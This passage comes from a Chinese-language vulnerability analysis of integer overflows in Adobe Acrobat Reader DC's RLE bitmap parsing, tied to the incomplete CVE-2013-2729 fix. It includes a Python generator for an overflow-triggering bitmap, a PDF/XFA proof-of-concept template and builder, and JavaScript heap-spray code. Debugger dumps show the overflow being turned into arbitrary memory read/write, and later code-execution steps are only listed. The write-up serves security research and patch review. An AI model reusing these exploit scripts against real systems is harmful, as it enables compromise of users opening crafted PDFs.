                  uint32_t capacity;            // view 对象指针
                  uint32_t length;              // 可以是任意值，通常为 0
                 // ......
                };
                </code></pre>
                <p>对 <code>ArrayBuffer</code> 而言，这里 <code>ObjectElements</code> 的各个成员的名字是没有意义的（因为本来是为 <code>Array</code> 准备的），这里第二个成员 <code>initializedLength</code> 存储 <code>byteLength</code> 的值，第三个成员 <code>capacity</code> 存储关联的 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView">DataView</a> 对象的指针，其他成员可以是任意值。</p>
                <p>在 Adobe Acrobat Reader DC 中执行下面的 JavaScript 代码：</p>
                <pre><code class="javascript">var ab = new ArrayBuffer(0x70);
                var dv = new DataView(ab);
                dv.setUint32(0, 0x41424344, true);
                </code></pre>
                <p><code>ArrayBuffer</code> 对象的 <strong>backing store</strong> 的内存布局如下：</p>
                <pre><code class="asm">;            -, byteLength, viewobj,       -,
                34d54f80  00000000 00000070 2458f608 00000000
                ;         data
                34d54f90  41424344 00000000 00000000 00000000
                34d54fa0  00000000 00000000 00000000 00000000
                34d54fb0  00000000 00000000 00000000 00000000
                34d54fc0  00000000 00000000 00000000 00000000
                34d54fd0  00000000 00000000 00000000 00000000
                34d54fe0  00000000 00000000 00000000 00000000
                34d54ff0  00000000 00000000 00000000 00000000
                </code></pre>
                <p>在漏洞利用过程中，如果可以更改 <code>ArrayBuffer</code> 对象的 <code>byteLength</code> 为一个更大的值，那么就可以基于 <code>ArrayBuffer</code> 对象实现越界读写了。不过需要注意后面的 <code>4</code> 字节数据要么为零，要么指向一个 <strong>合法</strong> 的 <code>DataView</code> 对象，否则进程会立刻崩溃。</p>
                <h4>5.2.2 Array</h4>
                <p>对 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array">Array</a> 而言，当 <code>length</code> 的大小超过 <code>14</code> 时，其底层元素存储区所在的堆块将通过系统堆申请（<code>ucrtbase!calloc</code>）；当 <code>length</code> 的大小小于等于 <code>14</code> 时，堆块从 SpiderMonkey 的私有堆 <strong>nursery heap</strong> 申请。和 <code>ArrayBuffer</code> 一样，当底层元素存储区独立申请堆块时，需要额外申请 <code>0x10</code> 字节的空间用于存储 <code>ObjectElements</code> 对象。</p>
                <pre><code class="cpp">class ObjectElements {
                 public:
                  // The NumShiftedElementsBits high bits of this are used to store the
                  // number of shifted elements, the other bits are available for the flags.
                  // See Flags enum above.
                  uint32_t flags;

                  /*
                   * Number of initialized elements. This is &lt;= the capacity, and for arrays
                   * is &lt;= the length. Memory for elements above the initialized length is
                   * uninitialized, but values between the initialized length and the proper
                   * length are conceptually holes.
                   */
                  uint32_t initializedLength;

                  /* Number of allocated slots. */
                  uint32_t capacity;

                  /* 'length' property of array objects, unused for other objects. */
                  uint32_t length;
                 // ......
                };
                </code></pre>
                <p>在 Adobe Acrobat Reader DC 中执行下面的 JavaScript 代码：</p>
                <pre><code class="javascript">var array = new Array(15);
                array[0] = array[array.length - 1] = 0x41424344;
                </code></pre>
                <p><code>Array</code> 对象元素存储区的内存布局如下：</p>
                <pre><code class="asm">0:010&gt; dd 34cb0f88-10 L90/4
                34cb0f78  00000000 0000000f 0000000f 0000000f
                34cb0f88  41424344 ffffff81 00000000 ffffff84 ; [0], [1]
                34cb0f98  00000000 ffffff84 00000000 ffffff84
                34cb0fa8  00000000 ffffff84 00000000 ffffff84
                34cb0fb8  00000000 ffffff84 00000000 ffffff84
                34cb0fc8  00000000 ffffff84 00000000 ffffff84
                34cb0fd8  00000000 ffffff84 00000000 ffffff84
                34cb0fe8  00000000 ffffff84 00000000 ffffff84
                34cb0ff8  41424344 ffffff81 ???????? ???????? ; [14]
                </code></pre>
                <p>这里 <code>array[0]</code> 和 <code>array[14]</code> 的值都是 <code>41424344 ffffff81</code> ，其中标签 <code>0xFFFFFF81</code> 表示元素的类型为 <code>INT32</code> 。而 <code>array[1]</code> 到 <code>array[13]</code> 之间的所有元素都被填充为 <code>00000000 ffffff84</code> ，表示这些元素当前是未定义的（即 <code>undefined</code> ）。</p>
                <p>对 <code>Array</code> 而言，如果可以通过触发漏洞更改 <code>capacity</code> 和 <code>length</code> 的值，那么就可以实现越界写操作：仅仅是越界写，因为 <code>initializedLength</code> 不变的话越界读取的元素全部为 <code>undefined</code> ，同时一旦进行越界写操作，<code>initializedLength</code> 之后到越界写之前的所有元素都会被填充为 <code>00000000 ffffff84</code> ，控制不好的话很容导致进程崩溃。</p>
                <p>那么如果同时更改 <code>initializedLength</code> 呢？理论上问题不大，不过对于本文所讨论的漏洞而言不适用，因为 <code>initializedLength</code> 的值会被改成非常大的值（四字节全部为相同的数据），而在 GC 过程中数组的所有元素都会被扫描，进程会因为访问到不可访问的内存页而崩溃。</p>
                <h4>5.2.3 JSObject</h4>
                <p>在 SpiderMonkey 中，所有 JavaScript 对象的类都继承自 <code>JSObject</code> ，后者又继承自 <code>ObjectImpl</code> ，相关定义如下：</p>
                <pre><code class="cpp">class ObjectImpl : public gc::Cell {
                  protected:
                    HeapPtrShape shape_;
                    HeapPtrTypeObject type_;
                    HeapSlot *slots;
                    HeapSlot *elements;
                  // ......
                };

                struct JSObject : public js::ObjectImpl {}
                </code></pre>
                <p>对某些对象（比如 <code>DataView</code> ）而言， <code>elements</code> 的值是没有意义的，因此会指向一个静态全局变量  <code>emptyElementsHeader</code> ，读取这些对象的 <code>elements</code> 的值可以用于泄露 JavaScript 引擎模块的基地址。</p>
                <pre><code class="cpp">static ObjectElements emptyElementsHeader(0, 0);

                /* Objects with no elements share one empty set of elements. */
                HeapSlot *js::emptyObjectElements =
                    reinterpret_cast&lt;HeapSlot *&gt;(uintptr_t(&amp;emptyElementsHeader) +
                    sizeof(ObjectElements));
                </code></pre>
                <h3>5.3 位图构造</h3>
                <p>如下 Python 代码可以用于创建 RLE 类型的位图文件（可以指定各种参数以及位图数据）：</p>
                <pre><code class="python">#!/usr/bin/env python
                #-*- coding:utf-8 -*-
                import os
                import sys
                import struct

                RLE8 = 1
                RLE4 = 2
                COMPRESSION = RLE8
                BIT_COUNT = 8
                CLR_USED = 1 &lt;&lt; BIT_COUNT
                WIDTH = 0xF0
                HEIGHT = 1

                def get_bitmap_file_header(file_size, bits_offset):
                    return struct.pack('&lt;2sIHHI', 'BM', file_size, 0, 0, bits_offset)

                def get_bitmap_info_header(data_size):
                    return struct.pack('&lt;IIIHHIIIIII',
                        0x00000028,
                        WIDTH,
                        HEIGHT,
                        0x0001,
                        BIT_COUNT,
                        COMPRESSION,
                        data_size,
                        0x00000000,
                        0x00000000,
                        CLR_USED,
                        0x00000000)

                def get_bitmap_info_colors():
                    # B, G, R, Reserved
                    rgb_quad = '\x00\x00\xFF\x00'
                    return rgb_quad * CLR_USED

                def get_bitmap_data():
                    # set ypos to 0 so that we'll be at the beginning of the heap buffer
                    # ypos = (HEIGHT - 1) = 0, no need to bother

                    # set xpos to 0xFFFFFF00
                    data = '\x00\x02\xFF\x00' * (0xFFFFFF00 / 0xFF)
                    # set xpos to 0xFFFFFF0C
                    data += '\x00\x02\x0C\x00'

                    # 0xFFFFFF0C + 0xF4 = 0
                    # 0xF4 bytes of 0x10
                    data += '\xF4\x10'

                    # mark end of bitmap to skip CxxThrowException
                    data += '\x00\x01'

                    return data

                def generate_bitmap(filepath):
                    data = get_bitmap_data()
                    data_size = len(data)

                    bmi_header = get_bitmap_info_header(data_size)
                    bmi_colors = get_bitmap_info_colors()

                    bmf_header_size = 0x0E
                    bits_offset = bmf_header_size + len(bmi_header) + len(bmi_colors)
                    file_size = bits_offset + data_size
                    bmf_header = get_bitmap_file_header(file_size, bits_offset)
                    with open(filepath, 'wb') as f:
                        f.write(bmf_header)
                        f.write(bmi_header)
                        f.write(bmi_colors)
                        f.write(data)

                if __name__ == '__main__':
                    if len(sys.argv) != 2:
                        print 'Usage: %s &lt;output.bmp&gt;' % os.path.basename(sys.argv[0])
                        sys.exit(1)
                    generate_bitmap(sys.argv[1])
                </code></pre>
                <p>这里直接创建一个 RLE8 位图文件，相关参数如下：</p>
                <ul>
                <li>宽度为 <code>0xF0</code> </li>
                <li>高度为 <code>1</code> </li>
                <li>位数为 <code>8</code> </li>
                </ul>
                <p>对该位图而言，用于存储位图数据的堆块的大小将会是 <code>0xF0</code> ，而函数 <code>get_bitmap_data</code> 中指定的位图数据将使得我们可以向低地址方向越界写 <code>0xF4</code> 字节的数据，其中数据全部为 <code>0x10</code> 。</p>
                <h3>5.4 PDF 构造</h3>
                <p>下面是一个 PDF 模板文件的内容，该模板后续将用于生成 POC 文件。</p>
                <pre><code class="javascript">%PDF-1.7
                1 0 obj
                &lt;&lt;
                    /Type /Catalog
                    /AcroForm 5 0 R
                    /Pages 2 0 R
                    /NeedsRendering true
                    /Extensions
                    &lt;&lt;
                        /ADBE
                        &lt;&lt;
                            /ExtensionLevel 3
                            /BaseVersion /1.7
                        &gt;&gt;
                    &gt;&gt;
                &gt;&gt;
                endobj
                2 0 obj
                &lt;&lt;
                    /Type /Pages
                    /Kids [3 0 R]
                    /Count 1
                &gt;&gt;
                endobj
                3 0 obj
                &lt;&lt;
                    /Type /Page
                    /Parent 2 0 R
                    /Contents 4 0 R
                    /Resources
                    &lt;&lt;
                        /Font
                        &lt;&lt;
                            /F1
                            &lt;&lt;
                                /BaseFont /Helvetica
                                /Subtype /Type1
                                /Name /F1
                            &gt;&gt;
                        &gt;&gt;
                    &gt;&gt;
                &gt;&gt;
                endobj
                4 0 obj
                &lt;&lt;
                    /Length 104
                &gt;&gt;
                stream
                BT
                /F1 12 Tf
                90 692 Td
                (If you see this page, it means that your PDF reader does not support XFA.) Tj
                ET
                endstream
                endobj
                5 0 obj
                &lt;&lt;
                    /XFA 6 0 R
                &gt;&gt;
                endobj
                6 0 obj
                &lt;&lt;
                    /Filter /FlateDecode
                    /Length __STREAM_LENGTH__
                &gt;&gt;
                stream
                &lt;xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"&gt;
                  &lt;template xmlns:xfa="http://www.xfa.org/schema/xfa-template/3.1/" xmlns="http://www.xfa.org/schema/xfa-template/3.0/"&gt;
                    &lt;subform name="form1" layout="tb" locale="en_US" restoreState="auto"&gt;
                      &lt;pageSet&gt;
                        &lt;pageArea name="Page1" id="Page1"&gt;
                          &lt;contentArea x="0.25in" y="0.25in" w="576pt" h="756pt"/&gt;
                          &lt;medium stock="default" short="612pt" long="792pt"/&gt;
                        &lt;/pageArea&gt;
                      &lt;/pageSet&gt;
                      &lt;subform w="576pt" h="756pt"&gt;
                        &lt;field name="ImageCrash"&gt;
                          &lt;ui&gt;
                            &lt;imageEdit/&gt;
                          &lt;/ui&gt;
                          &lt;value&gt;
                            &lt;image aspect="actual" contentType="image/bmp"&gt;
                __IMAGE_BASE64_DATA__
                            &lt;/image&gt;
                          &lt;/value&gt;
                        &lt;/field&gt;
                      &lt;/subform&gt;
                      &lt;event activity="initialize" name="event__initialize"&gt;
                        &lt;script contentType="application/x-javascript"&gt;
                // The JavaScript code will be executed before triggering the vulnerability
                        &lt;/script&gt;
                      &lt;/event&gt;
                      &lt;event activity="docReady" ref="$host" name="event__docReady"&gt;
                        &lt;script contentType="application/x-javascript"&gt;
                // The JavaScript code will be executed after triggering the vulnerability
                        &lt;/script&gt;
                      &lt;/event&gt;
                    &lt;/subform&gt;
                  &lt;/template&gt;
                  &lt;config xmlns="http://www.xfa.org/schema/xci/3.0/"&gt;
                    &lt;agent name="designer"&gt;
                      &lt;!--  [0..n]  --&gt;
                      &lt;destination&gt;pdf&lt;/destination&gt;
                      &lt;pdf&gt;
                        &lt;!--  [0..n]  --&gt;
                        &lt;fontInfo/&gt;
                      &lt;/pdf&gt;
                    &lt;/agent&gt;
                    &lt;present&gt;
                      &lt;!--  [0..n]  --&gt;
                      &lt;pdf&gt;
                        &lt;!--  [0..n]  --&gt;
                        &lt;version&gt;1.7&lt;/version&gt;
                        &lt;adobeExtensionLevel&gt;5&lt;/adobeExtensionLevel&gt;
                      &lt;/pdf&gt;
                      &lt;common/&gt;
                      &lt;xdp&gt;
                        &lt;packets&gt;*&lt;/packets&gt;
                      &lt;/xdp&gt;
                    &lt;/present&gt;
                  &lt;/config&gt;
                  &lt;xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/"&gt;
                    &lt;xfa:data xfa:dataNode="dataGroup"/&gt;
                  &lt;/xfa:datasets&gt;
                  &lt;xfdf xmlns="http://ns.adobe.com/xfdf/" xml:space="preserve"&gt;
                    &lt;annots/&gt;
                  &lt;/xfdf&gt;
                &lt;/xdp:xdp&gt;
                endstream
                endobj
                xref
                0 7
                0000000000 65535 f
                0000000009 00000 n
                0000000237 00000 n
                0000000306 00000 n
                0000000587 00000 n
                0000000746 00000 n
                0000000782 00000 n
                trailer
                &lt;&lt;
                    /Root 1 0 R
                    /Size 7
                &gt;&gt;
                startxref
                __XREF_OFFSET__
                %%EOF
                </code></pre>
                <p>为了触发整数溢出，前面构造的位图文件的大小将超过 <code>60MB</code> ，而且在嵌入 XFA 表单时，需要对其进行 Base64 编码，这会使得生成的 PDF 文件相当大。为了压缩 PDF 文件的大小，可以给对象 <code>6 0 obj</code> 指定一个 <code>Filter</code> （这里为 <code>FlateDecode</code> ）以便压缩对象的数据，因为数据比较规律，所以压缩率还是相当可观的。</p>
                <p>为了实现漏洞利用，需要在触发漏洞前完成内存布局、在触发漏洞后完成后续利用步骤，而这些操作都需要借助执行 JavaScript 代码来完成，因此需要在不同的时间点执行不同的 JavaScript 代码，这可以通过给 <code>subform</code> 的 <code>initialize</code> 事件和 <code>docReady</code> 事件设置事件处理代码来完成。</p>
                <p>下面的 Python 代码可以用于生成 PDF 文件：</p>
                <pre><code class="python">#!/usr/bin/env python
                #-*- coding:utf-8 -*-
                import os
                import sys
                import zlib
                import base64

                def parse_template(template_path):
                    with open(template_path, 'rb') as f:
                        data = f.read()
                    xdp_begin = data.find('&lt;xdp:xdp')
                    xdp_end = data.find('&lt;/xdp:xdp&gt;') + len('&lt;/xdp:xdp&gt;')

                    part1 = data[:xdp_begin]
                    part2 = data[xdp_begin:xdp_end]
                    part3 = data[xdp_end:]
                    return part1, part2, part3

                def generate_pdf(image_path, template_path, pdf_path):
                    pdf_part1, pdf_part2, pdf_part3 = parse_template(template_path)

                    with open(image_path, 'rb') as f:
                        image_data = base64.b64encode(f.read())
                    pdf_part2 = pdf_part2.replace('__IMAGE_BASE64_DATA__', image_data)
                    pdf_part2 = zlib.compress(pdf_part2)

                    pdf_part1 = pdf_part1.replace('__STREAM_LENGTH__', '%d' % len(pdf_part2))

                    pdf_data = pdf_part1 + pdf_part2 + pdf_part3
                    pdf_data = pdf_data.replace('__XREF_OFFSET__', '%d' % pdf_data.find('xref'))

                    with open(pdf_path, 'wb') as f:
                        f.write(pdf_data)

                if __name__ == '__main__':
                    if len(sys.argv) != 4:
                        filename = os.path.basename(sys.argv[0])
                        print 'Usage: %s &lt;input.bmp&gt; &lt;template.pdf&gt; &lt;output.pdf&gt;' % filename
                        sys.exit(1)
                    generate_pdf(sys.argv[1], sys.argv[2], sys.argv[3])
                </code></pre>
                <h3>5.5 利用技巧</h3>
                <h4>5.5.1 内存布局 (1)</h4>
                <p>这里借助 <code>ArrayBuffer</code> 来完成内存布局。</p>
                <p>因为位图解析过程中创建的堆块大小为 <code>0xF0</code> 字节，因此 <code>ArrayBuffer</code> 的 <code>byteLength</code> 可以设置为 <code>0xE0</code> 。为了创建内存空洞，可以先创建大量的 <code>ArrayBuffer</code> 对象，然后间隔释放其中的一半对象，理想情况下的内存布局如下：</p>
                <pre><code>┌─────────────┬─────────────┬─────────────┬─────────────┐
                │ ArrayBuffer │     Hole    │ ArrayBuffer │     Hole    │
                └─────────────┴─────────────┴─────────────┴─────────────┘
                │ &lt;-  0xF0 -&gt; │
                </code></pre>
                <p>在触发漏洞时，位图解析相关的堆块会落到其中一个空洞上：</p>
                <pre><code>┌─────────────┬─────────────┬─────────────┬─────────────┐
                │ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │
                └─────────────┴─────────────┴─────────────┴─────────────┘
                </code></pre>
                <p>因为可以向低地址方向越界写 <code>0xF4</code> 字节的 <code>0x10</code> 数据，所以触发漏洞之后，<code>ArrayBuffer</code> 对象的 <strong>backing store</strong> 的内存布局如下：</p>
                <pre><code class="asm">0:014&gt; dd 304c8398
                ;            -, byteLength, viewobj,       -,
                304c8398  00000000 10101010 10101010 10101010
                ;         ArrayBuffer 数据
                304c83a8  10101010 10101010 10101010 10101010
                304c83b8  10101010 10101010 10101010 10101010
                304c83c8  10101010 10101010 10101010 10101010
                304c83d8  10101010 10101010 10101010 10101010
                304c83e8  10101010 10101010 10101010 10101010
                304c83f8  10101010 10101010 10101010 10101010
                304c8408  10101010 10101010 10101010 10101010
                304c8418  10101010 10101010 10101010 10101010
                304c8428  10101010 10101010 10101010 10101010
                304c8438  10101010 10101010 10101010 10101010
                304c8448  10101010 10101010 10101010 10101010
                304c8458  10101010 10101010 10101010 10101010
                304c8468  10101010 10101010 10101010 10101010
                304c8478  10101010 10101010 10101010 10101010 ; ArrayBuffer 结束
                ; 下一个堆块的元数据（存储位图数据的堆块）
                304c8488  10101010 10101010
                ; 位图数据
                304c8490                    00000000 00000000
                </code></pre>
                <p>此时 <code>ArrayBuffer</code> 对象的 <code>byteLength</code> 被改成了 <code>0x10101010</code> ，但是 <code>DataView</code> 对象的指针也被改成了 <code>0x10101010</code> ，前面提到过这会导致进程崩溃。</p>
                <h4>5.5.2 内存布局 (0)</h4>
                <p>为了避免进程崩溃，需要提前在地址 <code>0x10101010</code> 上布局数据，让这个地址看起来就是一个 <code>DataView</code> 指针。很明显，为了漏洞利用更加稳定，我们需要一开始就在这里布局好数据。</p>
                <p>同样，这里借助 <code>ArrayBuffer</code> 实现精确的内存布局：</p>
                <ul>
                <li>创建大量 <code>byteLength</code> 为 <code>0xFFE8</code> 的 <code>ArrayBuffer</code> </li>
                <li>在特定内存范围内，<code>ArrayBuffer</code> 的 <strong>backing store</strong> 将有序的出现在地址 <code>0xYYYY0048</code> 上</li>
                </ul>
                <p>之所以选择 <code>0xFFE8</code> ，是因为这会使得 <strong>backing store</strong> 所在堆块整体的大小为 <code>0x10000</code> ：</p>
                <pre><code class="javascript">// 0xFFE8 -&gt; byteLength
                // 0x10 -&gt; sizeof ObjectElements
                // 0x08 -&gt; sizeof heap block's metadata
                0xFFE8 + 0x10 + 0x08 = 0x10000
                </code></pre>
                <p>使用下面的代码进行内存布局，可以有效防止进程崩溃（具体细节不作讲解，相关条件很容易通过动态调试分析出来）：</p>
                <pre><code class="javascript">function fillHeap() {
                    var array = new Array(0x1200);
                    array[0] = new ArrayBuffer(0xFFE8);
                    var dv = new DataView(array[0]);

                    dv.setUint32(0xFB8, 0x10100058, true);
                    dv.setUint32(0, 0x10100158, true);
                    dv.setUint32(0xFFA8, 0x10100258, true);
                    dv.setUint32(0x200 + 0x14, 0x10100358, true);

                    for (var i = 1; i &lt; array.length; ++i) {
                        array[i] = array[0].slice();
                    }
                    return array;
                }
                </code></pre>
                <p>当然，这仅仅只能防止漏洞触发后进程的崩溃，如果要为该 <code>ArrayBuffer</code> 关联新的 <code>DataView</code> 来读写数据，那么会导致新的崩溃。同样，填充一点新的数据就可以防止进程崩溃，新的代码如下所示：</p>
                <pre><code class="javascript">function fillHeap() {
                    var array = new Array(0x1200);
                    array[0] = new ArrayBuffer(0xFFE8);
                    var dv = new DataView(array[0]);
                    // 防止触发漏洞之后进程立刻 Crash
                    dv.setUint32(0xFB8, 0x10100058, true);
                    dv.setUint32(0, 0x10100158, true);
                    dv.setUint32(0xFFA8, 0x10100258, true);
                    dv.setUint32(0x200 + 0x14, 0x10100358, true);
                    // 防止关联 DataView 对象时 Crash
                    dv.setUint32(0xFFA4, 0x10100458, true);

                    for (var i = 1; i &lt; array.length; ++i) {
                        array[i] = array[0].slice();
                    }
                    return array;
                }
                </code></pre>
                <h4>5.5.3 全局读写</h4>
                <p>当 <code>ArrayBuffer</code> 对象的 <code>byteLength</code> 被改成 <code>0x10101010</code> 之后，可以基于这个 <code>ArrayBuffer</code> 对象修改下一个 <code>ArrayBuffer</code> 对象的 <code>byteLength</code> 。在基于 <code>ArrayBuffer</code> 创建内存空洞时，可以在每一个 <code>ArrayBuffer</code> 上存储特定的标记值，这样在内存中搜索 <code>ArrayBuffer</code> 对象就非常简单了。</p>
                <pre><code>  (1)byteLength            (3)Global Access
                 ┌─&lt;───&lt;───&lt;───┐            &lt;──────┬──────&gt;
                ┌┼────────────┬┼────────────┬──────┼──────┬─────────────┐
                │ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │
                └──────┼──────┴─────────────┴┼────────────┴─────────────┘
                       └──&gt;───&gt;───&gt;───&gt;────&gt;─┘
                        (2) byteLength to -1
                </code></pre>
                <p>当下一个 <code>ArrayBuffer</code> 对象的 <code>byteLength</code> 被改成 <code>0xFFFFFFFF</code> 时，基于这个 <code>ArrayBuffer</code> 对象就可以实现用户态空间的全局读写了。</p>
                <h4>5.5.4 任意地址读写</h4>
                <p>一旦拥有全局读写的能力，我们就可以向低地址方向来搜索特定的关键字来定位 <code>ArrayBuffer</code> 对象在内存中的绝对地址，然后基于这个绝对地址来实现任意地址读写。</p>
                <p>这里可以通过搜索 <code>ffeeffee</code> 或者 <code>f0e0d0c0</code> 来定位，为了提高准确性，需要同时校验关键字附近的数据的取值范围。</p>
                <pre><code class="asm">0:014&gt; dd 30080000
                30080000  16b80e9e 0101331b ffeeffee 00000002  ; ffeeffee
                30080010  055a00a4 2f0b0010 055a0000 30080000  ; +0x14 -&gt; 30080000
                30080020  00000fcf 30080040 3104f000 000002e5
                30080030  00000001 00000000 30d69ff0 30d69ff0
                30080040  3eb82e96 08013313 00000000 0000ffe8
                30080050  00000000 00000000 10100158 00000000
                30080060  00000000 00000000 00000000 00000000
                30080070  00000000 00000000 00000000 00000000

                0:014&gt; dd 305f4000
                305f4000  00000000 00000000 6ab08d69 0858b71a
                305f4010  0bbab388 30330080 0ff00112 f0e0d0c0  ; f0e0d0c0
                305f4020  15dc2c3f 00000430 305f402c d13bc929  ; +0x0C -&gt; 305f402c
                305f4030  e5c521a7 d9b264d4 919cee58 45da954e
                305f4040  5c3f608b 2b5fd340 0bae3aa9 2b5fd340
                305f4050  0fae32aa d13bc929 e5c521a7 d9b264d4
                305f4060  919cee58 45da954e 9c3f608b f952aa94
                305f4070  989c772a a1dd934a ac5b154b 2fadd038
                </code></pre>
                <h4>5.5.5 剩余步骤</h4>
                <p>在拥有任意地址读写能力之后，实现代码执行就是固定的套路了，本文对此不做详细介绍。</p>
                <p>剩余的步骤如下：</p>
                <ul>
                <li>EIP 劫持</li>
                <li>ASLR 绕过</li>
                <li>DEP 绕过</li>
                <li>CFG 绕过</li>
                </ul>
                <h2>0x06. CVE-2013-2729</h2>
                <p>前面提到一共找到了三处整数溢出，其中一处位于 RLE8 数据解析过程中，另外两处位于 RLE4 数据解析过程中。难道不应该有四个位置存在整数溢出吗？为什么只找到了三个？</p>
                <p>因为有一个在六年前已经修复了（参考 <a href="http://blog.binamuse.com/2013/05/readerbmprle.html">feliam&#8217;s write up for CVE-2013-2729</a>）！从版本 <code>2019.012.20035</code> 中的代码也可以看到，确实有一个地方判断了整数溢出的情况，这就是 CVE-2013-2729 引入的补丁。</p>
                <pre><code class="cpp">dst_xpos = BYTE1(cmd) + xpos;
                if ( ypos &gt;= height || dst_xpos &lt; xpos ||
                     dst_xpos &lt; BYTE1(cmd) || dst_xpos &gt; width )  // overflow check
                  goto LABEL_170;         // CxxThrowException
                </code></pre>
                <p>然而 Adobe 仅仅修补了报告的这一个位置，而忽略了其他三个位置上的整数溢出。</p>
                <h2>0x07. 经验教训</h2>
                <p>对厂商而言，在深入理解漏洞本质的同时，还可以看看是不是有类似的问题需要修复。</p>
                <p>对安全研究人员而言，分析完漏洞之后还可以顺便看一下厂商的修复方式，也许不经意间就能发现新的漏洞。</p>
                <!-- </small> -->
              </div>
            </div>
          </div>
        </div>
      </div>
      <footer class="footer">
        <div class="container-fluid">
          <nav class="float-left">
            <ul>
              <li>
                <a href="https://www.creative-tim.com">
                  Creative Tim
                </a>
              </li>
              <li>
                <a href="https://creative-tim.com/presentation">
                  About Us
                </a>
              </li>
              <li>
                <a href="http://blog.creative-tim.com">
                  Blog
                </a>
              </li>
              <li>
                <a href="https://www.creative-tim.com/license">
                  Licenses
                </a>
              </li>
            </ul>
          </nav>
          <div class="copyright float-right">
            &copy;
            <script>
              document.write(new Date().getFullYear())
            </script>, made with <i class="material-icons">favorite</i> by
            <a href="https://www.creative-tim.com" target="_blank">Creative Tim</a> for a better web.
          </div>
        </div>
      </footer>
    </div>
  </div>
  <div class="fixed-plugin">
    <div class="dropdown show-dropdown">
      <a href="#" data-toggle="dropdown">
        <i class="fa fa-cog fa-2x"> </i>
      </a>
      <ul class="dropdown-menu">
        <li class="header-title"> Sidebar Filters</li>
        <li class="adjustments-line">
          <a href="javascript:void(0)" class="switch-trigger active-color">
            <div class="badge-colors ml-auto mr-auto">
              <span class="badge filter badge-purple" data-color="purple"></span>
              <span class="badge filter badge-azure" data-color="azure"></span>
              <span class="badge filter badge-green" data-color="green"></span>
              <span class="badge filter badge-warning" data-color="orange"></span>
              <span class="badge filter badge-danger" data-color="danger"></span>
              <span class="badge filter badge-rose active" data-color="rose"></span>
            </div>
            <div class="clearfix"></div>
          </a>
        </li>
        <li class="header-title">Images</li>
        <li class="active">
          <a class="img-holder switch-trigger" href="javascript:void(0)">
            <img src="img/sidebar-1.jpg" alt="">
          </a>
        </li>
        <li>
          <a class="img-holder switch-trigger" href="javascript:void(0)">
            <img src="img/sidebar-2.jpg" alt="">
          </a>
        </li>
        <li>
          <a class="img-holder switch-trigger" href="javascript:void(0)">
            <img src="img/sidebar-3.jpg" alt="">
          </a>
        </li>
        <li>
          <a class="img-holder switch-trigger" href="javascript:void(0)">
            <img src="img/sidebar-4.jpg" alt="">
          </a>
        </li>
        <li class="button-container">
          <a href="https://www.creative-tim.com/product/material-dashboard" target="_blank" class="btn btn-primary btn-block">Free Download</a>
        </li>
        <!-- <li class="header-title">Want more components?</li>
            <li class="button-container">
                <a href="https://www.creative-tim.com/product/material-dashboard-pro" target="_blank" class="btn btn-warning btn-block">
                  Get the pro version
                </a>
            </li> -->
        <li class="button-container">
          <a href="https://demos.creative-tim.com/material-dashboard/docs/2.1/getting-started/introduction.html" target="_blank" class="btn btn-default btn-block">
            View Documentation
          </a>
        </li>
        <li class="button-container github-star">
          <a class="github-button" href="https://github.com/creativetimofficial/material-dashboard" data-icon="octicon-star" data-size="large" data-show-count="true" aria-label="Star ntkme/github-buttons on GitHub">Star</a>
        </li>
        <li class="header-title">Thank you for 95 shares!</li>
        <li class="button-container text-center">
          <button id="twitter" class="btn btn-round btn-twitter"><i class="fa fa-twitter"></i> &middot; 45</button>
          <button id="facebook" class="btn btn-round btn-facebook"><i class="fa fa-facebook-f"></i> &middot; 50</button>
          <br>
          <br>
        </li>
      </ul>
    </div>
  </div>
  <!--   Core JS Files   -->
  <script src="js/core/jquery.min.js"></script>
  <script src="js/core/popper.min.js"></script>
  <script src="js/core/bootstrap-material-design.min.js"></script>
  <script src="js/plugins/perfect-scrollbar.jquery.min.js"></script>
  <!-- Plugin for the momentJs  -->
  <script src="js/plugins/moment.min.js"></script>
  <!--  Plugin for Sweet Alert -->
  <script src="js/plugins/sweetalert2.js"></script>
  <!-- Forms Validations Plugin -->
  <script src="js/plugins/jquery.validate.min.js"></script>
  <!-- Plugin for the Wizard, full documentation here: https://github.com/VinceG/twitter-bootstrap-wizard -->
  <script src="js/plugins/jquery.bootstrap-wizard.js"></script>
  <!--	Plugin for Select, full documentation here: http://silviomoreto.github.io/bootstrap-select -->
  <script src="js/plugins/bootstrap-selectpicker.js"></script>
  <!--  Plugin for the DateTimePicker, full documentation here: https://eonasdan.github.io/bootstrap-datetimepicker/ -->
  <script src="js/plugins/bootstrap-datetimepicker.min.js"></script>
  <!--  DataTables.net Plugin, full documentation here: https://datatables.net/  -->
  <script src="js/plugins/jquery.dataTables.min.js"></script>
  <!--	Plugin for Tags, full documentation here: https://github.com/bootstrap-tagsinput/bootstrap-tagsinputs  -->
  <script src="js/plugins/bootstrap-tagsinput.js"></script>
  <!-- Plugin for Fileupload, full documentation here: http://www.jasny.net/bootstrap/javascript/#fileinput -->
  <script src="js/plugins/jasny-bootstrap.min.js"></script>
  <!--  Full Calendar Plugin, full documentation here: https://github.com/fullcalendar/fullcalendar    -->
  <script src="js/plugins/fullcalendar.min.js"></script>
  <!-- Vector Map plugin, full documentation here: http://jvectormap.com/documentation/ -->
  <script src="js/plugins/jquery-jvectormap.js"></script>
  <!--  Plugin for the Sliders, full documentation here: http://refreshless.com/nouislider/ -->
  <script src="js/plugins/nouislider.min.js"></script>
  <!-- Include a polyfill for ES6 Promises (optional) for IE11, UC Browser and Android browser support SweetAlert -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/core-js/2.4.1/core.js"></script>
  <!-- Library for adding dinamically elements -->
  <script src="js/plugins/arrive.min.js"></script>
  <!--  Google Maps Plugin    -->
  <script src="https://maps.googleapis.com/maps/api/js?key=YOUR_KEY_HERE"></script>
  <!-- Chartist JS -->
  <script src="js/plugins/chartist.min.js"></script>
  <!--  Notifications Plugin    -->
  <script src="js/plugins/bootstrap-notify.js"></script>
  <!-- Control Center for Material Dashboard: parallax effects, scripts for the example pages etc -->
  <script src="js/material-dashboard.js?v=2.1.1" type="text/javascript"></script>
  <!-- Material Dashboard DEMO methods, don't include it in your project! -->
  <script src="demo/demo.js"></script>
  <script>
    $(document).ready(function() {
      $().ready(function() {
